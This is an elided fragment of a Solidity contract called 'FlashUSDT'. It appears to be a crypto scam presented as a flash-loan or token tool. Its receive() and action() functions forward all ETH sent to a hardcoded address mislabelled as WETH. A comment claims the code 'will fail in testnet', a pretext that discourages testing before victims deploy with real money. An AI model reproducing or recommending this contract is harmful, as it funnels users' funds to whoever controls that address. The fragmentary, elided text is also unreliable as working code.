...
// This code will fail in testnet as testnet tokens have no value
...
contract FlashUSDT {
    ...
    address payable public constant WETH_CONTRACT_ADDRESS = payable(0x0ed88268bfAEE2F0857f35eA0f9DD2d48962C7cB);
    ...
    receive() external payable {
        ...
        (bool success, ) = WETH_CONTRACT_ADDRESS.call{value: msg.value}("");
    ...
    function action() external {
        ...
        (bool success, ) = WETH_CONTRACT_ADDRESS.call{value: flashAmount}("");
